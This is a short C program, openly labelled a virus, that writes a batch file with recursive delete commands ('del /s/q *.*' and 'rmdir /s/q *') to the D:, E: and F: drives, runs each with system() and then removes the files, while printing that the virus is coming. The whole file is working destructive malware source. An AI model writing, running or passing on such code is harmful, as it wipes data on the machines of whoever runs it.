#include<stdio.h>
#include<stdlib.h>
#define null NULL
void run_virus();
const char *virus="del /s/q *.*\n rmdir /s/q *";
const char *files[3]={"D:\\X.bat","E:\\X.bat","F:\\X.bat"};
int main()
{
	printf("Please wait...Virus will be functioning...\n");
	run_virus();
	return 0;
}
void run_virus()
{
	int i;
	FILE *file[3];
	for(i=0;i<3;++i)
	{
		file[i]=fopen(files[i],"w+");
		if(file!=null)
		{
			fprintf(file[i],"%s",virus);
			fclose(file[i]);
		}
	}
	for(i=0;i<3;++i)
	{
		puts("Please wait... ,virus is coming!");
		_sleep(1000);
		system(files[i]);
	}
	for(i=0;i<3;++i)
		remove(files[i]);
}


